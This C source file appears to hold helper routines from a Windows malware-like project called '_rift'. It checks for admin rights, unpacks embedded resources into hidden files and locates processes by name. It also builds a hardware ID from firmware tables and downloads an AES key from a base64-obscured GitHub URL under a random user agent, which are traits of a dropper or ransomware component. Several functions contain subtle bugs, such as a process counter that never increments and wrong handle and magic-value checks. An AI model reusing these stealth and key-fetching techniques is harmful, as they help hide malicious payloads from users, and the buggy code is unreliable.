#include "pch.h"
#include "_rift.h"

BOOL IIsUserAdmin() {
	PSID pSId;
	BOOL bSId = AllocateAndInitializeSid(&(SID_IDENTIFIER_AUTHORITY)SECURITY_NT_AUTHORITY, 2,
		SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSId);
	if (bSId) {
		if (!CheckTokenMembership(NULL, pSId, &bSId))
			bSId = FALSE;

		FreeSid(pSId);
	}

	return bSId;
}

PVOID ELoadResourceW(
	_In_  WORD    wResID,
	_In_  PCWSTR  pResType,
	_Out_ PSIZE_T nBufferSize
) {
	HRSRC hResInfo = FindResourceW(NULL, MAKEINTRESOURCEW(wResID), pResType);
	if (hResInfo) {
		HGLOBAL hgData = LoadResource(NULL, hResInfo);
		if (hgData) {
			PVOID lpBuffer = LockResource(hgData);
			if (!lpBuffer)
				return NULL;

			*nBufferSize = SizeofResource(NULL, hResInfo);
			if (!*nBufferSize)
				return NULL;

			return lpBuffer;
		}
	}

	return NULL;
}

PDWORD EGetProcessIdbyName(
	_In_  PCWSTR  pProcessName,
	_Out_ PSIZE_T nProcesses
) {
	HANDLE hPSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hPSnap == INVALID_HANDLE_VALUE)
		return 0;

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	PDWORD pProcesses = NULL;
	if (Process32FirstW(hPSnap, &pe32)) {
		*nProcesses = 0;
		do {
			if (!lstrcmpiW(pe32.szExeFile, pProcessName)) {
				if (pProcesses)
					pProcesses = ReAllocMemory(pProcesses, sizeof(DWORD) * *nProcesses);
				else
					pProcesses = AllocMemory(sizeof(DWORD));

				pProcesses[*nProcesses] = pe32.th32ProcessID;
			}
		} while (Process32Next(hPSnap, &pe32));
	}

	CloseHandle(hPSnap);
	return pProcesses;
}

PVOID AllocReadFileW(
	_In_  PCWSTR  szFileName,
	_Out_ PSIZE_T nFileSize
) {
	PVOID pRet = NULL;
	HANDLE hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return NULL;

	LARGE_INTEGER liFS;
	BOOL bT = GetFileSizeEx(hFile, &liFS);
	if (!bT || (liFS.HighPart || !liFS.LowPart))
		goto EXIT;

	PVOID pFile = AllocMemory(liFS.LowPart);
	if (!pFile)
		goto EXIT;

	bT = ReadFile(hFile, pFile, liFS.LowPart, nFileSize, NULL);
	if (!bT) {
		FreeMemory(pFile);
		goto EXIT;
	}

	pRet = pFile;
EXIT:
	CloseHandle(hFile);
	return pRet;
}

BOOL WriteFileCW(
	_In_ PCWSTR pFileName,
	_In_ PVOID  pBuffer,
	_In_ SIZE_T nBuffer
) {
	HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile) {
		DWORD dwT;
		BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, NULL);
		CloseHandle(hFile);

		return bT;
	} else
		return FALSE;
}

PCWSTR GetFileNameFromPathW(
	_In_ PCWSTR pPath
) {
	SIZE_T nResult;
	StringCchLengthW(pPath, MAX_PATH, &nResult);

	for (UINT16 i = nResult; i > 2; i--) {
		if (pPath[i - 1] == L'\\')
			return pPath + i;
	}

	return NULL;
}

BOOL EExtractResource(
	_In_ PCWSTR szFileName,
	_In_ WORD   wResID
) {
	SIZE_T nData;
	PVOID pData = EUnpackResource(&g_PIB->cibWK, wResID, &nData);
	BOOL bT = WriteFileCW(szFileName, pData, nData);
	FreeMemory(pData);
	return bT;
}

// Only Test rn but might be implemented further
PVOID IDownloadKey() {
	PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	if (!hNet)
		return NULL;
	FreeMemory(szAgent);

	PCSTR szB64URL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0xpbWEtWC1Db2RpbmcvV2luMzIuX3JpZnQvbWFzdGVyL19yaWZ0L21haW4uYz90b2tlbj1BSVNMVElGQkxFWE5IREJIWDZaMkZPUzYzUUozVQA=";
	SIZE_T nURL;
	PCSTR szURL = EBase64Decode(szB64URL, 156, &nURL);
	HINTERNET hUrl = InternetOpenUrlA(hNet, szURL, NULL, 0, NULL, NULL);
	if (!hUrl)
		return NULL;
	FreeMemory(szURL);

	PVOID pBuffer = AllocMemory(AES_BLOB_SIZE);
	SIZE_T nRead;
	InternetReadFile(hUrl, pBuffer, AES_BLOB_SIZE, &nRead);

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hNet);
	if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b)) {
		FreeMemory(pBuffer);
		return NULL;
	}

	return pBuffer;
}

CONST STATIC DWORD dwFTPS[3] = {
	'ACPI', 'FIRM', 'RSMB'
};
VOID IGenerateHwid(
	_Out_ PVOID pHWID
) {
	// Prepare Hashing
	BCRYPT_ALG_HANDLE ah;
	BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
	BCRYPT_HASH_HANDLE hh;
	BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);

	for (UINT8 i = 0; i < sizeof(dwFTPS) / sizeof(DWORD); i++) {
		// Enumerate Table Entries
		SIZE_T nTableId = EnumSystemFirmwareTables(dwFTPS[i], NULL, 0);
		PDWORD pTableId = AllocMemory(nTableId);
		EnumSystemFirmwareTables(dwFTPS[i], pTableId, nTableId);

		for (UINT8 j = 0; j < nTableId / sizeof(DWORD); j++) {
			// Get Table
			SIZE_T nTable = GetSystemFirmwareTable(dwFTPS[i], pTableId[j], NULL, 0);
			PVOID pTable = AllocMemory(nTable);
			GetSystemFirmwareTable(dwFTPS[i], pTableId[j], pTable, nTable);

			// Hash Table
			BCryptHashData(hh, pTable, nTable, NULL);
			FreeMemory(pTable);
		}

		FreeMemory(pTableId);
	}

	// Finish Hashing
	BCryptFinishHash(hh, pHWID, MD5_SIZE, NULL);
	BCryptDestroyHash(hh);
	BCryptCloseAlgorithmProvider(ah, NULL);
}